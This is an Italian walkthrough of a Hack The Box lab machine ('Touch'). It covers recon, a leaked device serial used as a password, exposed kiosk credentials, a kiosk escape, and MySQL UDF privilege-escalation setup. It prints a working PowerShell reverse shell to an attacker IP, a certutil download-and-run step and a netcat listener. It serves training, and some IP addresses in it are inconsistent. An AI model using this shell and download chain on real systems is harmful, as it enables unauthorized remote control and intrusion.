# Touch

IP vittima: 10.129.91.70 
IP attaccante: 10.10.14.73
# importante!
**La pagina HTB di attivazione della macchina fornisce questo suggerimento:**

```
In the Layover machine, you uncovered a name and a booking confirmation code. Maybe they'll come in handy here? **Jenny Crawford** / **KS7X2M**
```
## 1. Ricognizione delle porte

**Scansione TCP completa (ricerca porte aperte):**

```
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.91.70 -oG porte
```

- `-p-`: tutte le 65535 porte TCP.
- `--open`: mostra le porte aperte.
- `-sS`: SYN scan.
- `--min-rate 5000`: velocizza la scansione.
- `-n -Pn`: evita risoluzione DNS e discovery dell'host.
- `-oG porte`: salva l'output in formato greppable.

```
PORT     STATE SERVICE       REASON
135/tcp  open  msrpc         syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127
5985/tcp open  wsman         syn-ack ttl 127
8443/tcp open  https-alt     syn-ack ttl 127
```
Porte aperte: **135 (RPC), 3389 (RDP), 5985 (WinRM), 8443 (HTTP)**.

**Enumerazione mirata (ticerca servizi):**

```
sudo nmap -sC -sV -O -p135,3389,5985,8443 10.129.91.70 -oN servizi
```

- `-sC` esegue gli script NSE di default.
- `-sV` rileva servizi e versioni. 
- `-O` tenta il fingerprint del sistema operativo. 
- `-oN` salva il risultato.

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Service
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-title: Nexion DeviceHub - Login
|_Requested resource was /login
|_http-cors: GET POST PUT OPTIONS
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-trane-info: Problem with XML parsing of /evox/about
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 11|2008|7 (87%)
OS CPE: cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows 11 21H2 (87%), Microsoft Windows 7 or Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

- **Porta 135 (MSRPC):** Il servizio Remote Procedure Call di Windows. Viene utilizzato per le comunicazioni di base tra i servizi di rete Microsoft e per la risoluzione dei nomi. La sua presenza conferma la natura Windows dell'host.

- **Porta 3389 (ms-wbt-server):** È il servizio Remote Desktop Protocol (RDP). Permette a un utente di collegarsi e controllare l'interfaccia grafica del sistema da remoto. Se esposta direttamente su Internet, rappresenta un grave rischio per la sicurezza, essendo un bersaglio frequente per attacchi brute-force e ransomware.

- **Porta 5985 (HTTP / WinRM):** È il servizio Windows Remote Management su HTTP. Consente agli amministratori di eseguire comandi e script da remoto (tipicamente tramite PowerShell). Poiché opera su HTTP (la versione sicura HTTPS userebbe la porta 5986), il traffico non è crittografato.

- **Porta 8443 (HTTP):** Ospita un'interfaccia web personalizzata. Gli script di Nmap hanno identificato il titolo della pagina web come **"Nexion DeviceHub - Login"**. Si tratta del pannello di accesso a un software gestionale (spesso legato al settore automotive o IoT, dato il nome "Nexion DeviceHub").

La porta `8443` mostra l'applicazione **Nexion DeviceHub – Login**. Da questo momento concentriamo l'analisi sull'interfaccia web
## 2. Enumerazione porta 8443

### 2.1 Prima richiesta HTTP alla radice `/`

```
curl -i http://10.129.91.70:8443/
```

- `curl`: invia una richiesta HTTP.
- `-i`: mostra **anche gli header**, non soltanto il corpo della risposta.
- `/`: richiede la pagina iniziale del sito.

```
HTTP/1.1 302 Found
Transfer-Encoding: chunked
Location: /login
Server: Microsoft-HTTPAPI/2.0
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS
Access-Control-Allow-Headers: Content-Type
Date: Sat, 24 Oct 2026 21:23:07 GMT
```

`302` indica un **reindirizzamento temporaneo**. La riga `Location: /login` ci dice dove l'applicazione vuole inviare il browser.

**Conclusione:** abbiamo un'interfaccia di login; il prossimo URL da leggere è `/login`.
### 2.2 Lettura della pagina di login

**Dove:** Parrot.

```
curl -i http://10.129.91.70:8443/login
```
 ```
 HTTP/1.1 200 OK
Transfer-Encoding: chunked
Content-Type: text/html; charset=utf-8
...
 ```
La risposta `200 OK` contiene HTML di Nexion DeviceHub, con un form che invia una password tramite `POST /login`.
Nel codice della pagina compare un suggerimento: **la password predefinita è il numero seriale del dispositivo**:

``` html
<div class="login-hint" title="The default password is the device serial number included in your DeviceHub packaging."> Forgot your password? </div>
```

Questa frase è un indizio, dobbiamo scoprire il seriale.
### 2.3 Prima enumerazione con `ffuf`

```
ffuf -u http://10.129.91.70:8443/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,401,403,405 -t 30 -fs 0
```

**Come funziona `ffuf`:** prende le parole del dizionario e le sostituisce, una alla volta, a `FUZZ`. Per esempio prova percorsi quali `/admin`, `/login`, `/api` e così via.

|Opzione|Spiegazione|
|---|---|
|`-u .../FUZZ`|URL da enumerare; `FUZZ` è la parte sostituibile.|
|`-w /usr/share/wordlists/dirb/common.txt`|Dizionario di nomi comuni di directory e file.|
|`-mc 200,301,302,401,403,405`|Mostra risposte con questi status HTTP.|
|`-t 30`|Fino a 30 richieste concorrenti.|
|`-fs 0`|Esclude risposte con corpo di dimensione zero.|

**Risultati:**

```
api                     [Status: 403, Size: 35, Words: 2, Lines: 1, Duration: 35ms]
favicon.ico             [Status: 200, Size: 452, Words: 37, Lines: 1, Duration: 30ms]
login                   [Status: 200, Size: 3572, Words: 122, Lines: 3, Duration: 25ms]
:: Progress: [4614/4614] :: Job [1/1] :: 1136 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

Qui **scopriamo `/api`**.

- `login` con `200`: la pagina esiste.
- `api` con `403`: il percorso esiste ma rifiuta l'accesso.
- `favicon.ico` è solo l'icona del sito.

**Perché proseguire su `/api`?** Una risposta `403` è diversa dal comportamento tipico di una risorsa inesistente e ci indica che quella parte dell'applicazione merita di essere esplorata.
### 2.4 Verifica del comportamento dell'API

```
curl -i http://10.129.91.70:8443/api/
```

Risposta osservata:

```
HTTP/1.1 403 Forbidden
Transfer-Encoding: chunked
Content-Type: application/json
Server: Microsoft-HTTPAPI/2.0
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS
Access-Control-Allow-Headers: Content-Type
Date: Sat, 24 Oct 2026 21:34:28 GMT

{"error":"Authentication required"}%  
```

La risposta ha stato `403`: il punto di ingresso dell'API dichiara di richiedere autenticazione.

Controlliamo anche che cosa accade chiedendo un endpoint che sappiamo di non conoscere:

```
curl -i http://10.129.91.70:8443/api/questapaginanonesiste
```

**Risultato osservato:** `302 Location: /login`.

Questo è utile perché ci fornisce un **comportamento di riferimento**: diversi endpoint inesistenti vengono reindirizzati al login. Se usassimo `ffuf` senza filtrare tali redirect, potremmo ricevere molti risultati inutili.
### 2.5 Seconda enumerazione con `ffuf`

```
ffuf -u http://10.129.91.70:8443/api/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc all -fc 302 -t 30
```

**Differenza rispetto alla prima scansione:**

- Ora `FUZZ` è **all'interno di `/api/`**.
- `-mc all` accetta tutti gli status HTTP.
- `-fc 302` **esclude** i redirect `302` che abbiamo visto per gli endpoint inesistenti.

**Risultati osservati:**

```
scan                    [Status: 405, Size: 30, Words: 3, Lines: 1, Duration: 30ms]
status                  [Status: 200, Size: 116, Words: 3, Lines: 1, Duration: 25ms]
```

- `/api/status` risponde `200`: **endpoint esistente e raggiungibile**.
- `/api/scan` risponde `405`: l'endpoint esiste, ma non accetta il metodo HTTP `GET` usato dalla scansione. Non serve approfondirlo per questa catena d'attacco.
### 2.6 Lettura dell'endpoint scoperto

```
curl -i http://10.129.91.70:8443/api/status
```

```
HTTP/1.1 200 OK
Transfer-Encoding: chunked
Content-Type: application/json
Server: Microsoft-HTTPAPI/2.0
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS
Access-Control-Allow-Headers: Content-Type
Date: Sat, 24 Oct 2026 21:40:10 GMT

{"device":"Nexion DeviceHub DH-100","serial":"NX-DH-2024-B7042","firmware":"1.4.2","status":"online","uptime":78010}% 
```

La risposta è HTTP `200` e restituisce informazioni sul dispositivo: è online, firmware `1.4.2`, numero seriale:

```
NX-DH-2024-B7042
```

L'endpoint divulga questa informazione **senza login**. A questo punto colleghiamo due informazioni indipendenti:

1. La pagina `/login` suggeriva che la password predefinita corrisponde al numero seriale.
2. L'API `/api/status` fornisce il numero seriale.

Quindi possiamo provare il seriale come password.
## 3. Login a DeviceHub e recupero delle credenziali Windows

### 3.1 Autenticazione con il seriale

```
curl -i -c cookies.txt -X POST -d "password=NX-DH-2024-B7042" http://10.129.91.70:8443/login
```

```
HTTP/1.1 302 Found
Transfer-Encoding: chunked
Location: /dashboard
Server: Microsoft-HTTPAPI/2.0
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS
Access-Control-Allow-Headers: Content-Type
Set-Cookie: nxsession=2de62e3934c54d798b0474cfc8e7b32f; Path=/
Date: Sat, 24 Oct 2026 21:43:22 GMT
```

- `-X POST`: utilizza il metodo HTTP di invio del form di login.
- `-d "password=..."`: invia il parametro chiamato `password`.
- `-c cookies.txt`: salva i cookie ricevuti dal server in `cookies.txt` per riutilizzarli.
- `-i`: mostra status e header, utili per vedere redirect e cookie.

**Risultato osservato:** login accettato, risposta `302 Location: /dashboard` e cookie di sessione `nxsession`.

Un cookie di sessione è un identificativo che il browser invia nelle richieste successive per dimostrare di aver già effettuato l'accesso.

Possiamo anche inserire la password **NX-DH-2024-B7042** nella pagina di login entrando nella dashboard **Nexion Device Hub**.
### 3.2 Come leggere la dashboard autenticata

Dopo il login, abbiamo visualizzato l'HTML della dashboard e individuato i valori `KioskUser` e `K!0sk2026#` all'interno del codice JavaScript della pagina.

```
curl -s -b cookies.txt http://10.129.88.231:8443/dashboard
```

```
...
<tr><td class="label">Username</td><td class="mono"><span id="dsu1">••••••••</span> <span style="cursor:pointer;font-size:10px;color:#0ea5e9" onclick="toggleCred('dsu1','KioskUser')">show</span></td></tr>
<tr><td class="label">Password</td><td class="mono"><span id="dsp1">••••••••</span> <span style="cursor:pointer;font-size:10px;color:#0ea5e9" onclick="toggleCred('dsp1','K!0sk2026#')">show</span></td></tr>
...
<tr><td class="label">Username</td><td class="mono"><span id="dpu1">••••••••</span> <span style="cursor:pointer;font-size:10px;color:#0ea5e9" onclick="toggleCred('dpu1','KioskUser')">show</span></td></tr>
<tr><td class="label">Password</td><td class="mono"><span id="dpp1">••••••••</span> <span style="cursor:pointer;font-size:10px;color:#0ea5e9" onclick="toggleCred('dpp1','K!0sk2026#')">show</span></td></tr>
...
```

- `-b cookies.txt`: invia il cookie salvato dopo il login.
- `-s`: riduce l'output accessorio di `curl`.

Nella dashboard i valori erano presenti in chiamate JavaScript del tipo `toggleCred(...)` per mostrare/nascondere le credenziali.

**Credenziali Windows trovate:**

```
Username: KioskUser
Password: K!0sk2026#
```

**Perché ci interessano?** Nmap aveva trovato aperta la porta TCP `3389`, utilizzata da RDP. Abbiamo quindi un servizio di accesso remoto e credenziali Windows da provare.
## 4. Accesso RDP e kiosk escape

### 4.1 Collegamento alla sessione Windows

**Dove:** Parrot.

```
xfreerdp3 /v:10.129.91.70 /u:KioskUser /p:'K!0sk2026#' /sec:rdp
```

- `xfreerdp3`: client per Desktop remoto Windows.
- `/v:10.129.88.231`: IP della macchina Windows.
- `/u:KioskUser`: utente ricavato dalla dashboard.
- `/p:'K!0sk2026#'`: password; gli apici proteggono i caratteri speciali nell'ambiente shell Linux.
- `/sec:rdp`: modalità di sicurezza RDP utilizzata nel collegamento riuscito.

**Risultato:** la connessione riesce, ma al posto del normale desktop compare l'applicazione a schermo intero **HTB Airways Kiosk**.

![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020261024165815.png)

Una sessione **kiosk** limita l'utente a una particolare applicazione: avere credenziali RDP non implica poter avviare subito `cmd.exe` o utilizzare normalmente il desktop.
### 4.2 Dal DeviceHub al messaggio di errore

**Questi passaggi sono da effettuare nella dasboard Nexion DeviceHub e nella sessione RDP:**

1. Nel pannello **Nexion DeviceHub** disattiviamo lo scanner.
2. Ritorniamo alla sessione RDP in cui è aperto **HTB Airways Kiosk**.
3. Clicchiamo al centro poi scegliamo la lingua inglese poi inseriamo i dati suggeriti da HTB nela pagina di attivazione della macchina: `BOOKING REF`: **KS7X2M** e `LAST NAME`: **CRAWFORD**
4. Avviamo la funzione di scansione del documento dall'interfaccia del chiosco.
5. Poiché lo scanner è stato disattivato, l'applicazione mostra una finestra d'errore.

La finestra mostra:

![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020261025211917.png)
### 4.3 Dal collegamento di supporto a CMD

La finestra d'errore contiene un **collegamento HTTPS esterno**. Facendo clic si apre il browser Windows, uscendo dall'interfaccia strettamente controllata del kiosk.

Nella barra degli indirizzi del browser avviamo:

```
C:\Windows\System32\cmd.exe
```

Il file **cmd.exe** viene scaricato, ora lanciamolo ottenendo una finestra **cmd** funzionante. Il prompt ottenuto si trova in:

```
C:\Users\KioskUser\Downloads>
```
### 4.4 Verifica di identità e privilegi

Lanciamo:

```
whoami /all
```

Questo comando visualizza:

- l'utente effettivo della shell;
- i gruppi di cui fa parte;
- i privilegi presenti nel token di accesso;
- il livello di integrità.

**Risultato:** utente `KIOSK-042\KioskUser`, integrità **Medium**, membro tra l'altro di `Users`, `Remote Desktop Users` e del gruppo personalizzato `Printer Administrators`. Non siamo amministratori e non siamo SYSTEM.
## 5. Da CMD a una reverse shell PowerShell come KioskUser

CMD è già utile, ma una reverse shell consente di inviare comandi direttamente dal terminale Parrot senza lavorare nella finestra RDP.
### 5.1 Preparazione di `rev.ps1`

Sul Parrot predisponiamo un file PowerShell denominato **`rev.ps1`**:

```
$client = New-Object Net.Sockets.TCPClient('10.10.15.73',4444)
$stream = $client.GetStream()
$buffer = New-Object byte[] 65536

while (($n = $stream.Read($buffer,0,$buffer.Length)) -gt 0) {
    $cmd = [Text.Encoding]::UTF8.GetString($buffer,0,$n).Trim()
    if ($cmd -eq "exit") { break }

    try {
        $result = (Invoke-Expression $cmd 2>&1 | Out-String)
    } catch {
        $result = $_ | Out-String
    }

    $result += "PS " + (Get-Location).Path + "> "
    $bytes = [Text.Encoding]::UTF8.GetBytes($result)
    $stream.Write($bytes,0,$bytes.Length)
}

$client.Close()
```

- `TCPClient('10.10.15.73',4444)` si collega al Parrot.
- `GetStream()` recupera il canale TCP per leggere e scrivere dati.
- `Read(...)` riceve i comandi inviati dal listener.
- `Invoke-Expression` esegue il comando ricevuto nella sessione PowerShell.
- `Out-String` converte l'output in testo da restituire tramite la connessione.

Questa è una shell a comandi su TCP, **non** una sessione WinRM/SSH o un vero terminale interattivo con controllo completo della console.
### 5.2 Server per scaricare il file da Parrot

Sul terminale Parrot, nella directory che contiene `rev.ps1`.

```
python3 -m http.server 8000
```

Python avvia un server HTTP sulla porta 8000 e pubblica i file della directory corrente. Lasciamo il server attivo.

### 5.3 Listener per ricevere la connessione

**Dove:** secondo terminale Parrot.

```
nc -lvnp 4444
```

- `-l`: resta in ascolto.
- `-v`: output dettagliato.
- `-n`: non esegue risoluzioni DNS.
- `-p 4444`: utilizza la porta 4444.
### 5.4 Download dello script sul target

Sul CMD aperto sul Windows kiosk.

```
certutil -urlcache -f http://10.10.15.73:8000/rev.ps1 %TEMP%\rev.ps1
```

- `certutil`: programma nativo Windows; in questo caso viene utilizzato per scaricare un file HTTP.
- `-urlcache -f`: effettua il recupero forzando il download.
- `%TEMP%\rev.ps1`: percorso di destinazione nella directory temporanea dell'utente.
### 5.5 Esecuzione della reverse shell

Sul CMD del target.

```
powershell -NoP -ExecutionPolicy Bypass -File "%TEMP%\rev.ps1"
```

- `-NoP`: non carica il profilo PowerShell.
- `-ExecutionPolicy Bypass`: imposta per questo processo una policy che non blocca lo script.
- `-File`: esegue il file specificato.

**Risultato osservato:** il listener `nc` sulla porta `4444` riceve una connessione; i comandi PowerShell vengono eseguiti come `KioskUser`.

Lanciamo il comando `whoami` per attivare la shell ottenendo il prompt:

```
PS C:\Users\KioskUser\Downloads> 
```
## 6. Enumerazione locale

Individuiamo i servizi installati, identifichiamo quelli eseguiti come SYSTEM e controlliamo i permessi dei loro eseguibili.
### 6.1 Enumerazione dei servizi Windows

```
Get-CimInstance Win32_Service | Where-Object { $_.StartName -eq 'LocalSystem' } | Select-Object Name,State,PathName
```

> Questo è un ottimo comando per la fase di Windows Privilege Escalation, perché permette di individuare rapidamente i servizi eseguiti con privilegi elevati. Naturalmente non tutti questi servizi sono vulnerabili: il passaggio successivo consiste nel controllare con `icacls` se un utente ordinario può modificare gli eseguibili o altri file caricati dal servizio.

Il comando utilizza la classe WMI `Win32_Service` per elencare i servizi Windows eseguiti da `LocalSystem`.

|Campo|Significato|
|---|---|
|`Name`|Nome del servizio|
|`StartName`|Account che esegue il servizio|
|`State`|Stato del servizio|
|`PathName`|Percorso dell'eseguibile|
Tra i risultati individuiamo:

```
Name      : MySQL80
StartName : LocalSystem
State     : Running
PathName  : C:\MySQL\bin\mysqld.exe --defaults-file=C:\MySQL\my.ini MySQL80
```

- È installato un servizio MySQL chiamato `MySQL80`.
- Il servizio viene eseguito come `LocalSystem`, cioè `NT AUTHORITY\SYSTEM`.
### 6.2 Verificare i permessi della directory MySQL

Una volta individuato questo percorso:

```
C:\MySQL\bin\mysqld.exe
```

controlliamone i permessi NTFS:

```
icacls 'C:\MySQL\bin'
```

il risultato:

```
C:\MySQL\bin BUILTIN\Administrators:(I)(OI)(CI)(F)
             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
             BUILTIN\Users:(I)(OI)(CI)(RX)
             NT AUTHORITY\Authenticated Users:(I)(M)
             NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
```

Questa riga è fondamentale:

```
NT AUTHORITY\Authenticated Users:(I)(M)
```

Significa che gli utenti autenticati possiedono il permesso Modify.

Il nostro utente `KioskUser` appartiene proprio a questo gruppo.

Verifichiamo anche l'eseguibile:

```
icacls 'C:\MySQL\bin\mysqld.exe'
```

Risultato:

```
C:\MySQL\bin\mysqld.exe BUILTIN\Administrators:(I)(F)
                        NT AUTHORITY\SYSTEM:(I)(F)
                        BUILTIN\Users:(I)(RX)
                        NT AUTHORITY\Authenticated Users:(I)(M)
```

Un servizio eseguito come SYSTEM utilizza un eseguibile modificabile da un utente non amministratore. Questo non garantisce da solo la privilege escalation, ma costituisce un vettore da approfondire.

**Ricapitolando:**

```
Name      : MySQL80
StartName : LocalSystem
State     : Running
PathName  : C:\MySQL\bin\mysqld.exe --defaults-file=C:\MySQL\my.ini MySQL80

C:\MySQL\bin ...
NT AUTHORITY\Authenticated Users:(I)(M)

C:\MySQL\bin\mysqld.exe ...
NT AUTHORITY\Authenticated Users:(I)(M)
```

Interpretiamo ogni informazione:

- `State : Running`: MySQL è attivo.
- `StartName : LocalSystem`: il servizio è avviato con l'identità Windows `NT AUTHORITY\SYSTEM`.
- `PathName`: il servizio avvia l'eseguibile `mysqld.exe` e passa esplicitamente `--defaults-file=C:\MySQL\my.ini`.
- `Authenticated Users:(M)`: il gruppo degli utenti autenticati ha il permesso NTFS **Modify**.
- `(I)`: il permesso è ereditato da una directory superiore.

`KioskUser` appartiene a `Authenticated Users`. Quindi un account normale può modificare contenuti in una parte dell'installazione MySQL utilizzata da un servizio privilegiato.

**Che cosa manca?** Avere una directory scrivibile non basta per eseguire subito codice come SYSTEM. Dobbiamo ottenere accesso amministrativo a MySQL e capire come fargli caricare una DLL controllata da noi.
## 7. Dal backend HTB Airways alle prime credenziali MySQL

### 7.1 Come risaliamo ai sorgenti dell'applicazione

Cercando tra le cartelle del sistema abbiamo individuato `HTB Airways`

```
C:\Program Files\HTB Airways
```

Identificata la directory `HTB Airways`, si può vedere quali file TypeScript denominati `index.ts` contiene il backend:

```
Get-ChildItem 'C:\Program Files\HTB Airways\Kiosk\packages\backend\src' -Recurse -File -Filter 'index.ts' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
```

```
C:\Program Files\HTB Airways\Kiosk\packages\backend\src\index.ts
C:\Program Files\HTB Airways\Kiosk\packages\backend\src\config\index.ts
C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts
C:\Program Files\HTB Airways\Kiosk\packages\backend\src\schemas\index.ts
```

Ci interessa quello nella cartella `database`
#### Che cos'è il file `index.ts`?

`index.ts` è un file di codice sorgente TypeScript, un linguaggio di programmazione basato su JavaScript che aggiunge il controllo dei tipi.

L'estensione `.ts` significa infatti TypeScript.

Il nome `index.ts` viene comunemente utilizzato come punto di ingresso di un modulo, cioè il file principale attraverso il quale vengono organizzate ed esportate determinate funzionalità.

### 7.2 Lettura del codice che configura il database

Leggiamo il file `index.ts`

```
Get-Content 'C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts'
```

Le righe importanti:

```
import mysql from "mysql2/promise";

const DB_CONFIG_PATH = process.env.DB_CONFIG_PATH || "C:\\ProgramData\\HTB Airways\\db-config.ini";

const defaults = {
  host: "127.0.0.1",
  port: 3306,
  user: "kiosk_app",
  password: "K!0sk_R3pl1ca#DB",
  database: "htb_airways"
};
```

- `mysql2/promise` è una libreria Node.js per usare MySQL.
- `DB_CONFIG_PATH` indica il percorso di un file di configurazione, a meno che la variabile d'ambiente omonima ne specifichi un altro.
- `defaults` contiene le credenziali utilizzate come valori di fallback.

Nel resto del codice la funzione legge il file INI e, in caso di errore, restituisce `defaults`. Quindi **le credenziali presenti nel codice sono un candidato da verificare, non una prova che l'applicazione le stia usando in quel momento**.
### 7.3 Verifica delle credenziali `kiosk_app`

Lanciamo il comando: 

```
& 'C:\MySQL\bin\mysql.exe' -h 127.0.0.1 -u kiosk_app '-pK!0sk_R3pl1ca#DB' -D htb_airways -e "SELECT USER(), CURRENT_USER(); SHOW GRANTS;" 2>&1 | Out-String
```

- `mysql.exe` è il client del database; **non** il servizio `mysqld.exe`.
- `&` permette a PowerShell di eseguirlo dal percorso esplicito.
- `-h 127.0.0.1`: collegamento al server locale della macchina Windows.
- `-u kiosk_app`: account da usare.
- `'-pK!0sk_R3pl1ca#DB'`: password passata senza spazio dopo `-p`.
- `-D htb_airways`: database selezionato.
- `-e "..."`: istruzioni SQL da eseguire e poi uscire.
- `USER()` mostra l'identità di connessione; `CURRENT_USER()` mostra l'account SQL con cui vengono valutati i privilegi.
- `SHOW GRANTS` mostra i permessi dell'account corrente.
- `2>&1 | Out-String`: raccoglie anche l'output d'errore e lo presenta come testo nella reverse shell.

**Risultato osservato:**

```
USER()              CURRENT_USER()
kiosk_app@localhost kiosk_app@localhost

GRANT USAGE ON *.* TO `kiosk_app`@`localhost`
GRANT ALL PRIVILEGES ON `htb_airways`.* TO `kiosk_app`@`localhost`
```

La password funziona, ma `ALL PRIVILEGES` vale **soltanto sul database `htb_airways`**: non equivale a essere amministratori dell'intero server MySQL.

> Il client `mysql.exe` mostra un warning quando la password è nella riga di comando: `Using a password on the command line interface can be insecure`. Questo avviso **non è un fallimento del login**.
## 8. La vera password amministrativa: `refresh-dates.bat`

### 8.1 Perché esaminiamo `C:\ProgramData\HTB Airways`

Il codice `index.ts` visto sopra conteneva il percorso `C:\ProgramData\HTB Airways\db-config.ini`: **abbiamo quindi un riferimento esplicito a quella directory**. Non è una ricerca casuale.

La directory `C:\ProgramData` viene normalmente utilizzata dalle applicazioni Windows per conservare file di dati e configurazione condivisi.

Elenco delle sottodirectory di `C:\ProgramData`, eseguito nella sessione:

```
Get-ChildItem 'C:\ProgramData' -Force -Directory | Select-Object -ExpandProperty FullName
```

Tra quelle elencate appare:

```
C:\ProgramData\HTB Airways
```

Poi elenchiamo i file al suo interno, inclusi quelli nascosti:

```
Get-ChildItem 'C:\ProgramData\HTB Airways' -Force -Recurse -File -ErrorAction SilentlyContinue | Select-Object FullName,Length
```

**Risultato osservato:**

```
C:\ProgramData\HTB Airways\db-config.ini          286
C:\ProgramData\HTB Airways\db-sync-replica.ps1  10724
C:\ProgramData\HTB Airways\refresh-dates.bat      117
C:\ProgramData\HTB Airways\refresh-dates.sql     2282
```

- `db-config.ini`: file di configurazione MySQL; nel nostro contesto l'accesso in lettura era negato.
- `db-sync-replica.ps1`: script PowerShell relativo alla sincronizzazione; non serve al percorso risolutivo.
- `refresh-dates.sql`: istruzioni SQL per aggiornare dati.
- `refresh-dates.bat`: file batch molto corto, che merita di essere letto perché può mostrare **come** vengono eseguite le istruzioni SQL e con quale account.
### 8.2 Lettura del batch

```
Get-Content 'C:\ProgramData\HTB Airways\refresh-dates.bat' -ErrorAction Stop 2>&1 | Out-String
```

- `Get-Content`: legge il file di testo.
- `-ErrorAction Stop`: fa emergere come errore esplicito l'eventuale impossibilità di lettura.
- `2>&1 | Out-String`: rende visibili gli errori anche nel canale remoto.

**Contenuto effettivo:**

```
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul
```

La riga è breve ma decisiva:

|Frammento|Significato|
|---|---|
|`C:\MySQL\bin\mysql.exe`|Esegue il **client** MySQL.|
|`-u root`|Si autentica come **root del database**.|
|`-pHTB@irw4ys_DB!2026`|Fornisce la password **in chiaro**; nessuno spazio dopo `-p`.|
|`< "...\refresh-dates.sql"`|Legge il file SQL e lo passa allo standard input di MySQL.|
|`2>nul`|Reindirizza i messaggi sullo standard error al dispositivo `NUL`, scartandoli.|

**Credenziali trovate:**

```
Utente MySQL: root
Password:     HTB@irw4ys_DB!2026
```

`root` qui è il **superutente del server MySQL**, non l'utente Windows `Administrator` e nemmeno `NT AUTHORITY\SYSTEM`.
### 8.3 Verifica dell'accesso MySQL root

```
& 'C:\MySQL\bin\mysql.exe' -h 127.0.0.1 -u root '-pHTB@irw4ys_DB!2026' -e "SELECT CURRENT_USER(); SHOW GRANTS;" 2>&1 | Out-String
```

**Risultato osservato:**

```
CURRENT_USER()
root@localhost
```

`SHOW GRANTS` elenca privilegi globali, tra cui `INSERT`, `CREATE`, `FILE`, `SUPER` e altri permessi amministrativi su `*.*`.

**Conclusione:** l'account root di MySQL funziona e ha i permessi necessari per registrare una funzione UDF. Resta da verificare dove MySQL carica le DLL e se possiamo scrivere in quella directory.
## 9. `plugin_dir`: individuazione e verifica dei permessi

### 9.1 Come troviamo la directory dei plugin (senza indovinare)

MySQL espone variabili di configurazione consultabili con SQL. `plugin_dir` specifica la directory delle librerie plugin/UDF.

```
& 'C:\MySQL\bin\mysql.exe' -h 127.0.0.1 -u kiosk_app '-pK!0sk_R3pl1ca#DB' -e "SHOW VARIABLES LIKE 'plugin_dir';"
```

Avremmo potuto usare anche `root`, ma nella sessione questo comando è stato eseguito con l'account `kiosk_app`, sufficiente per leggere questa variabile.

**Risultato:**

```
Variable_name  Value
plugin_dir     C:\MySQL\lib\plugin\
```

**Quindi il percorso corretto è `C:\MySQL\lib\plugin\`**, non `C:\MySQL\bin`.

### 9.2 Perché controlliamo le ACL della directory

Per caricare una DLL scelta da noi dovremo prima poterla collocare in `plugin_dir`. La domanda è: **un utente senza privilegi, come `KioskUser`, può creare file lì?**

```
icacls 'C:\MySQL\lib\plugin'
```

**Risultato osservato:**

```
C:\MySQL\lib\plugin BUILTIN\Administrators:(I)(OI)(CI)(F)
                    NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                    BUILTIN\Users:(I)(OI)(CI)(RX)
                    NT AUTHORITY\Authenticated Users:(I)(M)
                    NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
```

Per interpretarlo:

- `Authenticated Users`: gruppo che comprende gli account autenticati, incluso il nostro `KioskUser`.
- `(M)`: permesso **Modify**, che include possibilità di scrittura/modifica.
- `(I)`: permesso **ereditato**.
- `(OI)`: ereditabile dai file (_Object Inherit_).
- `(CI)`: ereditabile dalle directory figlie (_Container Inherit_).
- `(IO)`: la specifica ACE serve per l'ereditarietà; non viene applicata direttamente alla directory corrente.

**Conclusione:** abbiamo confermato che `KioskUser` può depositare una DLL nella directory effettivamente utilizzata da MySQL.
## 10. Privilege escalation: MySQL UDF

### 10.1 Che cosa significa UDF?

Una **UDF – User Defined Function** è una funzione aggiuntiva di MySQL implementata in codice nativo. Il server può caricarla da una DLL presente nella directory `plugin_dir` e renderla disponibile in SQL.

Il meccanismo è importante:

```
Utente Windows KioskUser
      │
      ├─ può scrivere una DLL in C:\MySQL\lib\plugin
      │
      └─ può collegarsi a MySQL come root
                          │
                          ├─ MySQL carica la DLL tramite CREATE FUNCTION
                          │
                          └─ Il servizio MySQL gira come LocalSystem
                                            │
                                            └─ codice della DLL eseguito come SYSTEM
```

Una libreria di **Metasploit** chiamata `lib_mysqludf_sys_64.dll` espone la funzione `sys_eval`, in grado di lanciare comandi del sistema operativo e restituirne l'output.
### 10.2 Come troviamo la DLL di Metasploit

```
find /usr/share/metasploit-framework /usr/share/exploitdb -type f -iname '*mysql*udf*.dll' 2>/dev/null
```

- `find`: cerca file ricorsivamente.
- Le due directory indicano le installazioni locali di Metasploit e Exploit-DB.
- `-type f`: soltanto file regolari.
- `-iname '*mysql*udf*.dll'`: nome che contiene `mysql`, poi `udf`, con estensione `.dll`, senza distinzione maiuscole/minuscole.
- `2>/dev/null`: non mostra eventuali errori di accesso ai percorsi.

